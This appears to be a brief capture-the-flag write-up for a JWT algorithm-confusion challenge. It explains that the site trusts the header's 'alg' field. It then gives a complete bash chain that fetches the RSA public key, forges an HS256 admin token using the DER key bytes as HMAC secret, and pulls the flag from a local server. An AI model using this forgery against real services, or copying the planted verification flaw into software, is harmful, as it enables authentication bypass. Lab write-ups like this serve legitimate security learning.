vibe coded frontend cause i hate making websites ❤️

alg confusion

site jwt blindly trusts the algorithm asserted in "alg" in token header

strip extra bytes and b64 decode the rsa pubkey to get the der bytes

sign forged hs256 token with admin authorization with the der bytes as hmac secret

site sees "alg: hs256" and verifies with der encoded copy of pubkey, goes through as hs256 signs and verifies with same secret

example bash commands:

```bash
printf 'GET /publickey HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n' | nc localhost 32773 > /tmp/resp.txt
awk 'BEGIN{body=0} /^\r$/{body=1; next} body{print}' /tmp/resp.txt > /tmp/public.pem
grep -v -- '-----' /tmp/public.pem | tr -d '\n' | base64 -d > /tmp/pub.der
KEYHEX=$(od -An -tx1 /tmp/pub.der | tr -d ' \n')
b64url() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }
H=$(printf '%s' '{"alg":"HS256","typ":"JWT"}' | b64url)
P=$(printf '%s' '{"user":"attacker","role":"admin"}' | b64url)
SIGNING_INPUT="${H}.${P}"
SIG=$(printf '%s' "$SIGNING_INPUT" | openssl dgst -sha256 -mac HMAC -macopt hexkey:"$KEYHEX" -binary | b64url)
TOKEN="${SIGNING_INPUT}.${SIG}"
echo "$TOKEN"
printf 'GET /admin HTTP/1.1\r\nHost: localhost\r\nCookie: token=%s\r\nConnection: close\r\n\r\n' "$TOKEN" | nc localhost 32773 | grep -o 'class="flag">[^<]*'
```

note on source code:

pyjwt disallows using pem-armored string as hmac secret, so code uses a der-encoded copy of the pubkey to use as the hmac secret for hs256